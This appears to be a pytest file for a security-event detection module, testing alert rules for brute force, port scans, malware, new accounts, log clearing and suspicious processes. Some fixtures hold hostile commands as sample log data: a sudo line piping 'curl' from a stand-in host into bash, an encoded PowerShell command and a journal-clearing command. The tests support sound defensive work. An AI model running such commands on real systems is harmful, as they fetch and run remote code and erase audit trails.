from app.detection import (
    detect_event,
    detect_brute_force,
    detect_port_scan,
)


def test_failed_login_detection():
    event = {
        "event_type": "failed_login",
        "source_ip": "192.168.1.10",
        "username": "admin",
        "destination_port": 22,
        "status": "failed",
        "message": "Failed login attempt",
    }

    alert = detect_event(event)

    assert alert is not None
    assert alert["rule_name"] == "FAILED_LOGIN"
    assert alert["severity"] == "HIGH"
    assert alert["mitre_id"] == "T1110"


def test_port_scan_detection():
    event = {
        "event_type": "port_scan",
        "source_ip": "10.0.0.5",
        "username": "unknown",
        "destination_port": 22,
        "status": "suspicious",
        "message": "Nmap port scan detected",
    }

    alert = detect_event(event)

    assert alert is not None
    assert alert["rule_name"] == "NETWORK_PORT_SCAN"
    assert alert["severity"] == "HIGH"
    assert alert["mitre_id"] == "T1046"


def test_malware_detection():
    event = {
        "event_type": "malware",
        "source_ip": "10.0.0.20",
        "username": "user",
        "destination_port": 443,
        "status": "malicious",
        "message": "Malware detected",
    }

    alert = detect_event(event)

    assert alert is not None
    assert alert["rule_name"] == "MALWARE_DETECTED"
    assert alert["severity"] == "CRITICAL"


def test_suspicious_login_detection():
    event = {
        "event_type": "suspicious_login",
        "source_ip": "172.16.0.15",
        "username": "admin",
        "destination_port": 443,
        "status": "success",
        "message": "Suspicious login detected",
    }

    alert = detect_event(event)

    assert alert is not None
    assert alert["rule_name"] == "SUSPICIOUS_LOGIN"
    assert alert["severity"] == "MEDIUM"
    assert alert["mitre_id"] == "T1078"


def test_invalid_ip_is_ignored():
    event = {
        "event_type": "failed_login",
        "source_ip": "invalid-ip",
        "username": "admin",
        "destination_port": 22,
        "status": "failed",
        "message": "Failed login attempt",
    }

    alert = detect_event(event)

    assert alert is None


def test_normal_event_has_no_alert():
    event = {
        "event_type": "login",
        "source_ip": "192.168.1.50",
        "username": "user",
        "destination_port": 443,
        "status": "success",
        "message": "Normal successful login",
    }

    alert = detect_event(event)

    assert alert is None


def test_brute_force_detection():
    events = []

    for i in range(5):
        events.append(
            {
                "event_type": "failed_login",
                "source_ip": "192.168.1.100",
                "username": "admin",
                "destination_port": 22,
                "status": "failed",
                "message": "Failed login attempt",
                "timestamp": f"2026-09-03T10:0{i}:00+00:00",
            }
        )

    alerts = detect_brute_force(events)

    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "BRUTE_FORCE"
    assert alerts[0]["severity"] == "HIGH"
    assert alerts[0]["mitre_id"] == "T1110"


def test_port_scan_pattern_detection():
    events = []

    for port in [21, 22, 23, 80, 443]:
        events.append(
            {
                "event_type": "port_scan",
                "source_ip": "10.10.10.10",
                "username": "unknown",
                "destination_port": port,
                "status": "suspicious",
                "message": "Port scan",
                "timestamp": "2026-09-03T10:00:00+00:00",
            }
        )

    alerts = detect_port_scan(events)

    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "PORT_SCAN_PATTERN"
    assert alerts[0]["severity"] == "HIGH"
    assert alerts[0]["mitre_id"] == "T1046"


def _evt(event_type, minute, ip="203.0.113.7"):
    return {
        "event_type": event_type,
        "source_ip": ip,
        "timestamp": f"2026-10-12T10:{minute:02d}:00+00:00",
    }


def test_success_after_brute_force_is_critical():
    from app.detection import detect_success_after_failures

    events = [_evt("failed_login", m) for m in range(0, 5)] + [
        _evt("successful_login", 6)
    ]

    alerts = detect_success_after_failures(events)

    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "SUCCESS_AFTER_BRUTE_FORCE"
    assert alerts[0]["severity"] == "CRITICAL"
    assert alerts[0]["source_ip"] == "203.0.113.7"


def test_success_without_enough_failures_does_not_alert():
    from app.detection import detect_success_after_failures

    events = [_evt("failed_login", m) for m in range(0, 3)] + [
        _evt("successful_login", 4)
    ]

    assert detect_success_after_failures(events) == []


def test_success_from_different_ip_does_not_alert():
    from app.detection import detect_success_after_failures

    events = [_evt("failed_login", m) for m in range(0, 5)] + [
        _evt("successful_login", 6, ip="198.51.100.9")
    ]

    assert detect_success_after_failures(events) == []


def test_failures_outside_window_do_not_count():
    from app.detection import detect_success_after_failures

    events = [_evt("failed_login", m) for m in range(0, 5)] + [
        _evt("successful_login", 40)
    ]

    assert detect_success_after_failures(events) == []


def test_account_created_rule():
    event = {
        "event_type": "account_created",
        "source_ip": "10.0.0.5",
        "username": "backdoor",
        "message": "A user account was created.",
    }

    alert = detect_event(event)

    assert alert is not None
    assert alert["rule_name"] == "NEW_ACCOUNT_CREATED"
    assert alert["mitre_id"] == "T1136"


def test_windows_security_log_cleared_rule():
    alert = detect_event({
        "event_type": "security_log_cleared",
        "source_ip": "192.0.2.15",
        "message": "The Windows Security audit log was cleared.",
    })
    assert alert is not None
    assert alert["rule_name"] == "WINDOWS_SECURITY_LOG_CLEARED"
    assert alert["severity"] == "CRITICAL"


def test_windows_defender_malware_rule():
    alert = detect_event({
        "event_type": "malware_detected",
        "source_ip": "192.0.2.15",
        "message": "Microsoft Defender detected malware.",
    })
    assert alert is not None
    assert alert["rule_name"] == "MALWARE_DETECTED"
    assert alert["severity"] == "CRITICAL"


def test_process_created_only_alerts_for_suspicious_markers():
    ordinary = detect_event({
        "event_type": "process_created", "source_ip": "192.0.2.15", "message": "process=notepad.exe"
    })
    suspicious = detect_event({
        "event_type": "process_created", "source_ip": "192.0.2.15",
        "message": "process=powershell.exe command=-EncodedCommand ABCD"
    })
    assert ordinary is None
    assert suspicious is not None
    assert suspicious["rule_name"] == "WINDOWS_SUSPICIOUS_PROCESS"


def test_linux_security_events_alert_without_remote_ip():
    alert = detect_event({
        "event_type": "security_log_cleared",
        "platform": "linux",
        "message": "journalctl --vacuum-time=1d",
        "source_ip": "",
    })
    assert alert is not None
    assert alert["rule_name"] == "LINUX_SECURITY_LOG_CLEARED"
    assert alert["severity"] == "CRITICAL"


def test_linux_suspicious_sudo_command_rule():
    alert = detect_event({
        "event_type": "sudo_command",
        "source_ip": "192.0.2.25",
        "message": "sudo: alice : USER=root ; COMMAND=/usr/bin/curl http://example.invalid/script | bash",
    })
    assert alert is not None
    assert alert["rule_name"] == "LINUX_SUSPICIOUS_SUDO_COMMAND"


def test_platform_specific_rules_do_not_mislabel_linux_events_as_windows():
    linux_alert = detect_event({
        "event_type": "security_log_cleared",
        "platform": "linux",
        "source_ip": "",
        "message": "journalctl --vacuum-time=1d",
    })
    assert linux_alert is not None
    assert linux_alert["rule_name"] == "LINUX_SECURITY_LOG_CLEARED"

    windows_alert = detect_event({
        "event_type": "security_log_cleared",
        "platform": "windows",
        "source_ip": "192.0.2.1",
        "message": "The Windows Security audit log was cleared.",
    })
    assert windows_alert is not None
    assert windows_alert["rule_name"] == "WINDOWS_SECURITY_LOG_CLEARED"
